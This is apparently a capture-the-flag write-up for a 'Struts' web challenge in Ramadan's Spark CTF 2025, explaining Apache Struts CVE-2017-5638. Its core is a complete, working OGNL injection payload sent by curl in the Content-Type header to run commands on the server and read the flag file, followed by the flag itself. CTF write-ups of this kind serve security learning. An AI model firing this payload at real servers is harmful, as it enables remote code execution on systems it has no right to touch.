---
title: "Ramadan's Spark CTF 2025 — Struts"
description: 'Apache Struts CVE-2017-5638 RCE via Content-Type header'
pubDate: 'Mar 29 2025'
tags: ['ctf', 'web', 'struts', 'rce']
thumbnail: 'https://miro.medium.com/v2/resize:fit:1100/1*T6vQ8YC39LaGjHHsDB62qQ.png'
---

# Struts

<img src="https://miro.medium.com/v2/resize:fit:1100/1*T6vQ8YC39LaGjHHsDB62qQ.png" alt="Struts challenge" />

This challenge is vulnerable to **CVE-2017-5638** — the Apache Struts vulnerability. Struts is vulnerable to remote command injection through incorrectly parsing an attacker's invalid Content-Type HTTP header.

Payload using `curl`:

```bash
curl -X POST http://SERVER-IP:8080/product-catalog/ \
-H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

This should give you `root` as output. By changing `#cmd` to `'cat /opt/flag.txt'` you get the flag.

**Flag:** `Spark{B0ou3radaFTW!!_23qd45sq6}`
